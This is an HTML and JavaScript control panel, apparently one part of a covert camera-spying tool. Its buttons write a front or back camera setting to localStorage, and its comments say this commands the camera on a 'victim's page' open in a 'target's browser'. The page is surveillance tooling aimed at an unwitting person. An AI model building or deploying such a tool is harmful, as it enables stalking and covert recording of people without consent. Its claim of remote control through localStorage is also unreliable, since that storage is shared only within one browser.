<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Control Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1f2937;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .panel {
            background-color: #374151;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        h2 { margin-top: 0; margin-bottom: 20px; }
        .btn {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            font-size: 18px;
            font-weight: bold;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-front { background-color: #3b82f6; }
        .btn-front:hover { background-color: #2563eb; }
        
        .btn-back { background-color: #10b981; }
        .btn-back:hover { background-color: #059669; }

        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #9ca3af;
        }
    </style>
</head>
<body>

    <div class="panel">
        <h2>📷 Target Camera Control</h2>
        
        <button class="btn btn-front" onclick="switchCamera('user')">
            Switch to FRONT Camera
        </button>
        
        <button class="btn btn-back" onclick="switchCamera('environment')">
            Switch to BACK Camera
        </button>

        <div class="status" id="status-text">
            Currently commanded: <strong id="current-target" style="color: #fff;">Front Camera</strong>
        </div>
    </div>

    <script>
        // Check current setting on load
        window.onload = () => {
            const current = localStorage.getItem('cameraTarget');
            if (current === 'environment') {
                document.getElementById('current-target').innerText = "Back Camera";
            } else {
                document.getElementById('current-target').innerText = "Front Camera";
            }
        };

        function switchCamera(facingMode) {
            // This instantly updates localStorage, which triggers the 'storage' event on the victim's page
            localStorage.setItem('cameraTarget', facingMode);
            
            const modeText = facingMode === 'environment' ? 'Back Camera' : 'Front Camera';
            document.getElementById('current-target').innerText = modeText;
            
            alert(`Command sent: Switched to ${modeText}.\n\n(Note: The main site must be open in the target's browser for this to take effect)`);
        }
    </script>
</body>
</html>
